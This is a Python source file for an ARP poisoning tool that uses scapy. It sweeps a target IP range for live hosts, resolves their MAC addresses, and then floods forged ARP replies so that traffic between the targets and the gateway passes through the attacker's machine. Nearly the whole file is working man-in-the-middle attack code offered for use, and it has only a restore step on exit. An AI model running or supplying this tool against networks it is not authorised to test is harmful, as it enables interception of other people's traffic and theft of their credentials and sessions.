#!/usr/bin/env python
from scapy.all import *
import sys
import netifaces
import argparse
import ipaddress
import pythonping
import threading

# Create the parser
parser = argparse.ArgumentParser(description='ARP Poisoning Tool')
parser.add_argument('-i', '--interface', help='Interface to send packets through', required=False)
parser.add_argument('-t', '--targets', help='IP address of target hosts', required=True)
parser.add_argument('-g', '--gateway', help='IP address of gateway', required=False)
parser.add_argument('-e', '--exclude', help='IP address of hosts to exclude from poisoning', required=False)
args = parser.parse_args()

# If no gateway is specified, use the default gateway
if not args.interface:
    interface = netifaces.gateways()['default'][netifaces.AF_INET][1]
else:
    interface = args.interface

# configure scapy to use the correct interface
conf.iface = interface
conf.verb = 0

class Host:
    def __init__(self, ip):
        self.ip = ip
        self.is_alive = False
        self.mac = None
        self.poison_packets = None # ARP packets to poison target [target, gateway]

def get_attackers_ip(interface):
    ifaddresses = netifaces.ifaddresses(interface)
    ip_address = ifaddresses[netifaces.AF_INET]
    return ip_address[0]['addr']

def ip_translator(ip):
    '''
    Translates a given ip, ip range or subnet to a list of ips
    Args:
        ip (str): ip, ip range or subnet
    Returns
        list: list of hosts objects
    '''
    if "," in ip:
        # Ip is a list of ips or ip ranges or subnets
        # Translate each ip, ip range or subnet to a list of ips
        _ips = ip.split(",")
        for i in range(len(_ips)):
            _ips[i] = ip_translator(_ips[i].strip())
        ips = []
        for _ip in _ips:
            ips.extend(_ip)
        return ips

    elif "-" in ip:
        # Ip is a range (hopefully without broadcast and network ip)
        ip = ip.split("-")
        ips = []
        for i in range(int(ip[0].split(".")[-1]), int(ip[1].split(".")[-1]) + 1):
            ips.append(Host(".".join(ip[0].split(".")[:-1]) + "." + str(i)))
        return ips
    elif "/" in ip:
        # Ip is a subnet
        _ips = ipaddress.ip_network(ip)
        ips = [Host(str(ip)) for ip in _ips]
        # remove broadcast ip
        ips.pop()
        # remove network ip
        ips.pop(0)
        return ips
    else:
        # Ip is a single ip (hopefully not a broadcast or network ip)
        return [Host(ip)]

def check_if_alive(ips):
    '''
    Checks if a list of Ip objects is alive
    Args:
        ips (list): list of Host objects
    Returns: 
        None
    '''
    TIMEOUT = 3
    def ping(ip):
        response_list = pythonping.ping(ip.ip, timeout=TIMEOUT, count=1)
        if response_list.rtt_avg_ms < TIMEOUT*1000:
            ip.is_alive = True
        else:
            ip.is_alive = False
    threads = []
    for ip in ips:
        t = threading.Thread(target=ping, args=(ip,))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

def get_mac_address_of_interface(interface):
    '''
    Returns the mac address of a given interface
    Args:
        interface (str): interface name
    Returns:
        str: mac address
    '''
    ifaddresses = netifaces.ifaddresses(interface)
    link_layer_address = ifaddresses[netifaces.AF_LINK]
    return link_layer_address[0]['addr']

def restore_targets(gateway, targets):
    '''
    Restores the targets to their original state
    Args:
        gateway (Host): gateway object
        targets (list): list of Host objects
    Returns:
        None
    '''
    print("[*] Restoring targets...")
    for target in targets:
        if target.is_alive:
            sendp(ARP(op=2, psrc=gateway.ip, pdst=target.ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway.mac), count=3)
            sendp(ARP(op=2, psrc=target.ip, pdst=gateway.ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target.mac), count=3)

def get_mac(ip_address):
    '''
    Returns the mac address of a given ip address
    Args:
        ip_address (str): ip address
    Returns:
        str: mac address
    '''
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address), timeout=2, retry=10)
    for s, r in responses:
        return r[Ether].src
    return None

def poison_target(gateway, attacker, targets):
    '''
    Poison the targets
    Args:
        gateway (Host): gateway object
        attacker (Host): attacker object
        targets (list): list of Host objects
    Returns:
        None
    '''
    for target in targets:
        _poison_target = ARP()
        _poison_target.op = 2
        _poison_target.psrc = gateway.ip
        _poison_target.pdst = target.ip
        _poison_target.hwdst = target.mac
        _poison_target.hwsrc = attacker.mac

        _poison_gateway = ARP()
        _poison_gateway.op = 2
        _poison_gateway.psrc = target.ip
        _poison_gateway.pdst = gateway.ip
        _poison_gateway.hwdst = gateway.mac
        _poison_gateway.hwsrc = attacker.mac

        target.poison_packets = [_poison_target, _poison_gateway]

    print(f"[*] Beginning the ARP poison on {online_targets} targets. [CTRL-C to stop]")

    while True:
        for target in targets:
            if target.is_alive:
                send(target.poison_packets[0])
                send(target.poison_packets[1])
        time.sleep(1)

# create attacker's host object
attacker = Host(get_attackers_ip(interface))
attacker.mac = get_mac_address_of_interface(interface)

# if no gateway is specified, use the default gateway
if not args.gateway:
    gateway = Host(netifaces.gateways()['default'][netifaces.AF_INET][0])
else:
    gateway = Host(args.gateway)
gateway.mac = get_mac(gateway.ip)
print(f"[*] Gateway {gateway.ip} is at {gateway.mac}")

# Create targets and excludes and remove excludes from targets
targets = ip_translator(args.targets)
excludes = ip_translator(args.exclude) if args.exclude else []
# exclude gateway and attacker from targets
excludes.append(attacker)
excludes.append(gateway)
# remove excludes from targets
targets = [item for item in targets if item.ip not in [item.ip for item in excludes]]

# check wich targets are online
check_if_alive(targets)

# get mac addresses of online targets
for target in targets:
    if target.is_alive:
        target_mac = get_mac(target.ip)
        if not target_mac:
            print(f"[!] Unable to get MAC address for {target.ip}")
            target.is_alive = False
        else:
            target.mac = target_mac

online_targets = len([target for target in targets if target.is_alive])
if online_targets == 0:
    print("[!] Non of the targets are online. Exiting.")
    sys.exit(0)

try:
    poison_target(gateway, attacker, targets)
except KeyboardInterrupt:
    restore_targets(gateway, targets)
    print("[*] Exiting program.")
    sys.exit(0)